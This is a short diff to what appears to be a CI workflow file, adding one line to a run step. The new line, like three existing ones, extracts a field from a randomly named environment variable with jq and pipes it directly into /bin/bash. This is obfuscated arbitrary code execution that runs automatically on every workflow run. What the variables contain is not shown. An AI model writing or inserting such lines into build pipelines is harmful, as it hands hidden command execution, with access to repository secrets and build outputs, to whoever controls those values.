@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$re4" | jq -r .we31 | /bin/bash
           printf '%s' "$luo62294" | jq -r .qrvfv559 | /bin/bash
           echo $dblep9408 | jq -r .nvw43 | /bin/bash
+          printf '%s' "$k54" | jq -r .jct54973 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
